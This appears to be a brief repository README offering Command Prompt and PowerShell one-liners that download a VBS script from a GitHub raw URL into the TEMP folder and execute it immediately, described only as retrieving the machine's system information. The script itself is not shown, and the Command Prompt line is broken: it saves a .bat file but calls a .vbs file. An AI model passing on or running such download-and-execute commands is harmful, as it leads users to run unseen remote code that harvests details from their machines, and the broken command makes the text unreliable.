# install

#command retrieve machine's system information#

***Command Prompt

curl -s -o "%TEMP%\get_infor.bat" "https://raw.githubusercontent.com/hoanggiang-4897/install/main/get_infor.vbs" && call "%TEMP%\get_infor.vbs"

***Powershell

Invoke-RestMethod -Uri "https://raw.githubusercontent.com/hoanggiang-4897/install/main/get_infor.vbs" -OutFile "$env:TEMP\get_infor.vbs"; wscript //nologo "$env:TEMP\get_infor.vbs"
